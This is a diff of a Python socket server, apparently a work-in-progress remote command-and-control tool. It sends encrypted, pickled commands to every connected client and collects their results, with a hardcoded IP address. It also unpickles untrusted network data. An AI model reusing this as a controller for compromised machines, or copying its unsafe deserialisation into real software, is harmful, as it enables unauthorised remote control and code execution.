@@ -11,6 +11,8 @@ import mysql.connector as mysql
 
 #TODO
 #   1.  Change the result dict to --> who : [{command : result}, {command : result}]
+#   PROBLEM --> The server receives the results as b' command : result. Gotta figure out a way
+#               to cast the command to a string-object, now it's a byte object line 90
 
 
 HVA = '145.109.151.121'
@@ -59,14 +61,14 @@ def connHandler(socket, x):
             who = pickle.loads(conn.recv(2048))
             socketDict.update({who : [conn, key]}) #store key
             conn.send(pickle.dumps(key)) #send key
-            resultDict.update({who : [{}]}) #For every new conn, initialize it with who : [results]
+            resultDict.update({who : []}) #For every new conn, initialize it with who : [results]
         except Exception as e:
             print(e)
 
 #   --> Sends commands to every socket in the socketDict
 def sendCommands():
-    for key in socketDict.keys():
-        for command in commandList:
+    for key in socketDict.keys(): #For each key,
+        for command in commandList: #Send a command, try and receive a response, for every command
             try:
                 command = encryptAES(command, socketDict[key][1][0], socketDict[key][1][1])
                 command = pickle.dumps(command)
@@ -82,14 +84,15 @@ def sendCommands():
 #   --> Receives something from a socket, key is the key in socketDict.
 #       socketDict[key][0] is a socket, [1][0] and [1][1] are keys
 def receive(key):
+    #pdb.set_trace()
     try:
-        x = pickle.loads(socketDict[key][0].recv(2048)) #Deserialize
+        x = socketDict[key][0].recv(2048)
         x = decryptAES(x, socketDict[key][1][0], socketDict[key][1][1]) #Decrypt
-        # |||||| SHOULD STORE RESULTDICT[KEY][WHO, {COMMAND : OUTPUT}] ||||||||||
+        x = pickle.loads(x)
         resultDict[key].append(x) #store the result for said connection in resultDict
     except Exception as e:
         print(e)
-        time.sleep(1)
+        time.sleep(100)
 
 #   --> try to connect to the database
 def connDatabase(resultDict):
